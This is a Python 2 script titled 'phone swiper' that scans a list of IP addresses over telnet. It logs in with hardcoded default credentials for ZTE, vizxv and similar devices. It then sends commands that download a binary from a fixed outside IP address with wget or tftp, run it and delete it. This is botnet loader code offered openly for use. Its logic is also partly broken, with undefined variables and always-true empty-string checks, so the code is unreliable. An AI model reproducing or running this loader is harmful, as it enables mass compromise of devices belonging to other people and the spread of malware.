#!/usr/bin/python
# phone swiper By; LiGhT
# You wanted it? Now you got it... fucking idiots
import threading, sys, time, random, socket, re, os

if len(sys.argv) < 2:
        print "Usage: python "+sys.argv[0]+" <list>"
        sys.exit()

ips = open(sys.argv[1], "r").readlines()
usernames = ["root", "admin", "root", "root", "root"] #DONT CHANGE
passwords = ["oelinux123", "admin", "Zte521", "vizxv", "mdm9607"] #DONT CHANGE
cmd = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://81.28.6.115/ass.arm4;chmod 777 ass.arm4; ./ass.arm4 arm" #arm4 binary
url = "http://81.28.6.115/ass.arm4" # ARM4 Binary
sh_file = "http://81.28.6.115/ass.arm4" # SH File
count = 0
binary = url.split("/")
binary = binary[3]
ip = binary[2]

def readUntil(tn, string, timeout=15):
    buf = ''
    start_time = time.time()
    while time.time() - start_time < timeout:
        buf += tn.recv(1024)
        time.sleep(0.01)
        if string in buf: return buf
    raise Exception('TIMEOUT!')

class hackify(threading.Thread):
        def __init__ (self, ip):
			threading.Thread.__init__(self)
			self.ip = str(ip).rstrip('\n')
        def run(self):
		try:
			tn = socket.socket()
			tn.settimeout(8)
			tn.connect((self.ip,23))
		except Exception:
			tn.close()
		try:
			hoho = ''
			hoho += readUntil(tn, ":")
			if "" in hoho:
				r00t = 1
				username = usernames[1]
				password = passwords[1]
				tn.send(username + "\n")
			elif "" in hoho:
				r00t = 1
				username = usernames[0]
				password = passwords[0]
				tn.send(username + "\n")
			if "" in hoho:
				zte = 1
				username = usernames[2]
				password = passwords[2]
				tn.send(username + "\n")
			elif "" in hoho:
				zte = 1
				username = usernames[2]
				password = passwords[2]
				tn.send(username + "\n")
			elif "" in hoho:
				zte = 1
				username = usernames[2]
				password = passwords[2]
				tn.send(username + "\n")
		  	if "" in hoho:
				r00t = 1
				username = usernames[1]
				password = passwords[1]
				tn.send(username + "\n")
			elif "" in hoho:
				r00t = 1
				username = usernames[1]
				password = passwords[1]
				tn.send(username + "\n")
			elif "" in hoho:
				r00t = 1
				username = usernames[1]
				password = passwords[1]
				tn.send(username + "\n")
			elif "" in hoho:
				r00t = 1
				username = usernames[1]
				password = passwords[1]
				tn.send(username + "\n")
			elif "" in hoho:
				r00t = 1
				username = usernames[1]
				password = passwords[1]
				tn.send(username + "\n")
			elif "" in hoho:
				r00t = 1
				username = usernames[1]
				password = passwords[1]
				tn.send(username + "\n")
			if "" in hoho:
				r00t = 1
				username = usernames[4]
				password = passwords[4]
				tn.send(username + "\n")
			elif "" in hoho:
				r00t = 1
				username = usernames[4]
				password = passwords[4]
				tn.send(username + "\n")
			elif "" in hoho:
				r00t = 1
				username = usernames[4]
				password = passwords[4]
				tn.send(username + "\n")
			elif "" in hoho:
				r00t = 1
				username = usernames[4]
				password = passwords[4]
				tn.send(username + "\n")
			elif "" in hoho:
				r00t = 1
				username = usernames[4]
				password = passwords[4]
				tn.send(username + "\n")
			elif "" in hoho:
				r00t = 1
				username = usernames[4]
				password = passwords[4]
				tn.send(username + "\n")
			elif "" in hoho:
				r00t = 1
				username = usernames[4]
				password = passwords[4]
				tn.send(username + "\n")
			if "(none)" in hoho:
				vizxv = 1
				username = usernames[3]
				password = passwords[3]
				tn.send(username + "\n")
		        if "" in hoho:
				BCM = 1
				username = usernames[1]
				password = passwords[1]
				tn.send(username + "\n")
		except Exception:
			tn.close()
		try:
			hoho = ''
			hoho += readUntil(tn, "Password:")
			if "assword" in hoho:
				tn.send(password + "\n")
				#if r00t: print "[%s] sending root password"%(self.ip)
				#if not r00t: print "[%s] sending non-root password"%(self.ip)
				time.sleep(3)
		except Exception:
			tn.close()
		try:
			mp = ''
			mp += tn.recv(1024)
			if "#" in mp or "$" in mp or "~" in mp or ">" in mp or "root@" in mp: # !DO NOT CHANGE ANYTHING! #
					if r00t: tn.send("cd /tmp; wget "+url+" -O phone; chmod 777 phone; ./phone; rm -rf phone" + "\n"); print "\033[31m[pito] Command Sent %s!\033[37m"%(self.ip); time.sleep(8); tn.close()
					if notr00t: tn.send("su" + "\n"); readUntil(tn, "Password:"); tn.send(passwords[0] + "\n"); time.sleep(1); tn.send("cd /tmp; wget "+url+" -O phone; chmod 777 phone; ./phone; rm -rf phone" + "\n"); print "\033[30m[PHONE] Command Sent %s!\033[37m"%(self.ip); time.sleep(8); tn.close()
					if zte: tn.send("cd /var/; rm -rf busybox filename; wget "+url+" -O filename ; cp /bin/busybox ./; busybox cat filename > busybox;./busybox ;rm -rf busybox filename" + "\n"); print "\033[31m[ZTE] Command Sent %s!\033[37m"%(self.ip); time.sleep(8); tn.close()
					if vizxv: tn.send("cd /var/ || cd /tmp/ || cd /dev/; tftp -r "+binary+" -g "+ip+"; chmod 777 "+binary+"; ./"+binary+"; rm -rf "+binary+""); print "\033[32m[VIZXV] Command Sent %s!\033[37m"%(self.ip); time.sleep(8); tn.close()
					if BCM: tn.send(spawn_shell + "\n"); time.sleep(1); tn.send("cd /tmp; wget "+sh_file+" -O l.sh; sh l.sh; rm -rf /tmp/*" + "\n"); print "\033[32m[BCM] Command Sent %s!\033[37m"%(self.ip); time.sleep(8); tn.close()
		except Exception:
			tn.close()

print "Total IPs: %s\n"%(len(ips))
for ip in ips:
	try:
		count += 1
		t = hackify(ip)
		t.start()
		time.sleep(0.01)
	except:
		pass



